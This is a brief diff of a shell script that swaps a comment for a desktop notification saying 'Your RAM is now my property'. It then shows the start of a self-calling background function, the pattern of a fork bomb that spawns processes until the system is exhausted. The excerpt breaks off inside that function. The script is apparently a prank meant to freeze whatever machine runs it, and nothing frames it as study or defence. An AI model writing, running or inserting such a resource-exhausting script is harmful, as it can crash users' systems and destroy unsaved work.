@@ -1,5 +1,5 @@
 #!/bin/sh
-# I hereby claim 1 and 0
+notify-send "Hippity hoppity" "Your RAM is now my property"
 a () {
     sleep 1
     a &
